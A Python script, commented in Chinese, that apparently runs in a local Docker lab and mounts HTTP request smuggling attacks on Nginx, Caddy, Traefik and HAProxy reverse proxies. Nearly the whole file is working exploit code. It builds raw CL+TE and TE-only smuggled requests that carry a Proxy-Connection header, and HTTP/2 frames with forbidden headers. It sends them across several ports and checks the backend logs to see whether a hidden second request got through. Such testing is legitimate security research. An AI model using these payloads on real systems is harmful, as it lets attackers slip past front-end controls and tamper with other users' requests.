#!/usr/bin/env python3
"""
尽多向量尝试「proxy-connection / TE / 走私」相关攻击（不限于 HEADERS_proxy_connection_response.txt 的单一帧序列）。

说明：
- 四个代理都会测；此前仅 Nginx 在「重毒」H2 PoC 上未立即 RST，故加强 H1 与多端口。
- HAProxy :8080、Traefik :9080 为 **h2c**，通常 **不是** 明文 HTTP/1.1；脚本会尝试并标记失败。
- Nginx/Caddy 的 **:10080 / :11080** 常可同时处理 H1 与 h2c，**H1 走私/畸形头** 走这里更易触达 proxy_pass。

成功判据（任一）：
  - backend 日志出现 `Proxy-Connection:`（大小写不敏感）；
  - 同一条连接上两个可区分的「请求」标记（如 `/poc-h1-second` 作为独立 NEW REQUEST）；
  - 或明显 TE/CL 解包错位（人工看 tail）。
"""

from __future__ import annotations

import argparse
import socket
import ssl
import subprocess
import sys
import time
from hpack import Encoder
from hyperframe.frame import (
    DataFrame,
    HeadersFrame,
    PingFrame,
    SettingsFrame,
)

CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

MARK_H1_POST = "/poc-aggr-h1-post"
MARK_H1_SMUGGLE = "/poc-aggr-h1-second"
MARK_H2 = "/poc-aggr-h2-minimal"


def read_exact(s: socket.socket, n: int) -> bytes:
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            break
        b += c
    return b


def h2_drain_frames(tls: ssl.SSLSocket, max_frames: int = 8, tmo: float = 1.0) -> list[str]:
    tls.settimeout(tmo)
    out: list[str] = []
    for _ in range(max_frames):
        try:
            h = read_exact(tls, 9)
            if len(h) < 9:
                break
            length = (h[0] << 16) | (h[1] << 8) | h[2]
            typ = h[3]
            pl = read_exact(tls, length)
            if len(pl) < length:
                break
            out.append(f"type={typ} len={length}")
        except (OSError, socket.timeout):
            break
    return out


def h2_handshake_quick(sock: ssl.SSLSocket) -> None:
    sock.settimeout(2.0)
    for _ in range(64):
        try:
            h = read_exact(sock, 9)
            if len(h) < 9:
                return
            length = (h[0] << 16) | (h[1] << 8) | h[2]
            pl = read_exact(sock, length) if length else b""
            if len(pl) < length:
                return
            if h[3] == 0x04 and not (h[4] & 0x01):  # SETTINGS, not ACK
                ack = SettingsFrame(0)
                ack.flags.add("ACK")
                sock.sendall(ack.serialize())
            elif h[3] == 0x06 and not (h[4] & 0x01):  # PING
                pf = PingFrame(0, opaque_data=pl[:8].ljust(8, b"\0"))
                pf.flags.add("ACK")
                sock.sendall(pf.serialize())
        except socket.timeout:
            return


def send_h2_post(
    host: str,
    port: int,
    tls: bool,
    headers: list[tuple[bytes, bytes]],
    body: bytes,
) -> tuple[str, list[str]]:
    label = f"h2 {'tls' if tls else 'h2c'} {host}:{port}"
    try:
        raw = socket.create_connection((host, port), timeout=8)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            s = ctx.wrap_socket(raw, server_hostname=host)
        else:
            s = raw
        s.sendall(CONNECTION_PREFACE)
        s.sendall(SettingsFrame(0).serialize())
        h2_handshake_quick(s)
        enc = Encoder()
        block = enc.encode(headers)
        s.sendall(HeadersFrame(1, data=block, flags=["END_HEADERS"]).serialize())
        s.sendall(DataFrame(1, data=body, flags=["END_STREAM"]).serialize())
        frames = h2_drain_frames(s)  # type: ignore[arg-type]
        s.close()
        return label, frames
    except Exception as e:
        return label, [f"EXC {type(e).__name__}: {e}"]


def send_raw_http1(host: str, port: int, raw: bytes, use_ssl: bool) -> tuple[str, bytes]:
    label = f"h1 {'https' if use_ssl else 'http'} {host}:{port}"
    try:
        raw_sock = socket.create_connection((host, port), timeout=8)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(raw_sock, server_hostname=host)
        else:
            sock = raw_sock
        sock.sendall(raw)
        sock.settimeout(2.0)
        chunks: list[bytes] = []
        try:
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                chunks.append(c)
                if sum(len(x) for x in chunks) >= 16384:
                    break
        except socket.timeout:
            pass
        resp = b"".join(chunks)
        sock.close()
        return label, resp
    except Exception as e:
        return label, f"EXC {e}".encode()


def run_all(host: str) -> None:
    results: list[str] = []

    # ---------- H1：CL+TE 走私（经典），带 Proxy-Connection ----------
    h1_cl_te = (
        f"POST {MARK_H1_POST} HTTP/1.1\r\n"
        f"Host: {host}:11080\r\n"
        "Proxy-Connection: keep-alive\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"GET {MARK_H1_SMUGGLE} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    ).encode()

    # ---------- H1：仅 TE chunked + 尾缀假请求 ----------
    h1_te_only = (
        f"POST {MARK_H1_POST}b HTTP/1.1\r\n"
        f"Host: {host}:11080\r\n"
        "Proxy-Connection: close\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"GET {MARK_H1_SMUGGLE}b HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    ).encode()

    # ---------- H1 → Caddy 10080 ----------
    h1_caddy = (
        f"POST {MARK_H1_POST} HTTP/1.1\r\n"
        f"Host: {host}:10080\r\n"
        "Proxy-Connection: keep-alive\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"GET {MARK_H1_SMUGGLE} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    ).encode()

    plain_targets = [
        (11080, h1_cl_te, "nginx:11080 CL+TE+Proxy-Conn"),
        (11080, h1_te_only, "nginx:11080 TE+Proxy-Conn"),
        (10080, h1_caddy, "caddy:10080 CL+TE+Proxy-Conn"),
    ]

    print("=== Phase A: raw HTTP/1.1 on cleartext ports (nginx 11080, caddy 10080) ===\n")
    for port, payload, desc in plain_targets:
        lb, resp = send_raw_http1(host, port, payload, use_ssl=False)
        snippet = resp[:120].replace(b"\r\n", b" | ")
        results.append(f"{desc}: {lb} -> {snippet!r}")

    # ---------- H1 over TLS 443 映射端口（部分栈仍走 H2 ALPN；可能失败）----------
    print("\n=== Phase B: HTTP/1.1-shaped bytes over TLS (ALPN h2 — 多半被 H2 解析，易失败) ===\n")
    for port, name in [(11443, "nginx"), (10443, "caddy"), (9443, "traefik"), (8443, "haproxy")]:
        lb, resp = send_raw_http1(host, port, h1_cl_te.replace(b":11080", f":{port}".encode()), use_ssl=True)
        results.append(f"{name} tls raw h1: {resp[:80]!r}")

    # ---------- H2 弱化：仅 proxy-connection，无 TE/CL 冲突 ----------
    print("\n=== Phase C: H2 minimal forbidden header (proxy-connection only, small body) ===\n")
    authority = lambda p: f"{host}:{p}".encode()
    small_body = b"x=1"
    for port, name in [(8443, "haproxy"), (9443, "traefik"), (10443, "caddy"), (11443, "nginx")]:
        hdrs = [
            (b":method", b"POST"),
            (b":scheme", b"https"),
            (b":path", MARK_H2.encode()),
            (b":authority", authority(port)),
            (b"proxy-connection", b"keep-alive"),
            (b"content-type", b"application/x-www-form-urlencoded"),
            (b"content-length", str(len(small_body)).encode()),
        ]
        lb, frames = send_h2_post(host, port, True, hdrs, small_body)
        results.append(f"{name} h2 minimal proxy-conn: {frames}")

    # ---------- H2：proxy-connection + 仅 CL（无 TE）----------
    print("\n=== Phase D: H2 proxy-connection + content-length only ===\n")
    body50 = b"Y" * 50
    for port, name in [(11443, "nginx"), (10443, "caddy"), (9443, "traefik"), (8443, "haproxy")]:
        hdrs = [
            (b":method", b"POST"),
            (b":scheme", b"https"),
            (b":path", (MARK_H2 + "b").encode()),
            (b":authority", authority(port)),
            (b"proxy-connection", b"keep-alive"),
            (b"content-length", b"50"),
        ]
        lb, frames = send_h2_post(host, port, True, hdrs, body50)
        results.append(f"{name} h2 proxy-conn+CL: {frames}")

    # ---------- h2c 8080/9080：H1 探测（预期失败）----------
    print("\n=== Phase E: raw H1 on h2c-only ports (expect failure) ===\n")
    for port, nm in [(8080, "haproxy-h2c"), (9080, "traefik-h2c")]:
        lb, resp = send_raw_http1(host, port, h1_cl_te[:200], use_ssl=False)
        results.append(f"{nm}: {resp[:60]!r}")

    for line in results:
        print(line)

    print("\n=== docker logs backend --tail 200 (after 1s sleep) ===\n")
    time.sleep(1)
    try:
        p = subprocess.run(
            ["docker", "logs", "backend", "--tail", "200"],
            capture_output=True,
            text=True,
            timeout=20,
        )
        log = (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        log = str(e)
    sys.stdout.write(log)

    # 成功扫描
    low = log.lower()
    ok_proxy = "proxy-connection" in low or "proxy-connection:" in log.lower()
    ok_paths = MARK_H1_SMUGGLE in log or MARK_H1_SMUGGLE + "b" in log
    print("\n=== 自动判定 ===")
    print(f"  日志含 proxy-connection 相关: {ok_proxy}")
    print(f"  日志含走私路径 {MARK_H1_SMUGGLE}: {ok_paths}")
    if not ok_proxy and not ok_paths:
        print("  未命中简单规则：请人工查看上方原始请求块是否出现双线请求或 body 夹带 GET。")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    args = ap.parse_args()
    run_all(args.host)
    return 0


if __name__ == "__main__":
    sys.exit(main())
